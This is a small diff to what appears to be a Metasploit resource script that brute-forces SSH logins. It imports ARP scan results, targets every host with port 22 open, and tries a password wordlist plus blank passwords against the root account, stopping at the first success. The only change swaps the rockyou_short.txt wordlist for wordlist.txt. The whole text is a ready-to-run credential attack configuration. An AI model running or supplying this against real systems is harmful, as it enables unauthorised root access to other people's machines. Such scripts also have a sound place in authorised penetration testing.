@@ -2,7 +2,7 @@ workspace AUTOSCAN
 db_import arp-scan.xml
 services -p 22 -u -R
 use auxiliary/scanner/ssh/ssh_login
-set PASS_FILE rockyou_short.txt
+set PASS_FILE wordlist.txt
 set BLANK_PASSWORDS True
 set STOP_ON_SUCCESS True
 set USERNAME root
